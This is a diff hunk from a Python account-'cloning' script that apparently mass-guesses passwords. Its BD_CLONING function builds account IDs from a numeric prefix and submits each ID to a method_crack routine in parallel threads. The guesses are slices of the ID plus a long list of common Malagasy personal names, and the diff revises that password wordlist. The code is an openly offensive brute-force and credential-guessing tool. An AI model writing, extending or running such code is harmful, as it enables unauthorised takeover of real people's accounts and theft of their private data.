@@ -115,8 +115,8 @@ def BD_CLONING():
         print(' CLONING EN COURS ... ')
         linex()
         for psx in user:
-            ids=code+psx 
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'nomena','Nomena','lafatra','lahatra','Lahatra','fahendrena','mahery','Mahery','Fahendrena','amboara','Amboara','miangaly','Miangaly','miangola','Miangola','fanasina','Fanasina','fiderana','Fiderana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','solofo','Solofo','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','malala','Malala','mirana','Mirana','faniry','Faniry','rakoto','safidy','Safidy','valisoa','Valisoa','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','sarobidy','Sarobidy','andriatsitohaina','Andriatsitohaina','lalaina','Lafatra','diamondra','Diamondra','finaritra','Finaritra','tahiana','Tahiana','voahangy','Voahangy','Lalaina']
+            ids=code+psx
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'nomena','Nomena','lafatra','fahendrena','Fahendrena','amboara','Amboara','miangaly','Miangaly','miangola','Miangola','fanasina','Fanasina','fiderana','Fiderana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','solofo','Solofo','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','avotra','Avotra','domoina','Domoina','faniry','Faniry','rakoto','safidy','hasina','Hasina','tsilavina','Tsilavina','finaritra','Finaritra','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','sarobidy','Sarobidy','andriatsitohaina','Andriatsitohaina','lalaina','Lafatra','Jessica','Lalaina','mahery','Mahery','jessica','mandresy','Mandresy','harena','Harena']
             Dipto.submit(method_crack,ids,passlist)
             
     linex()
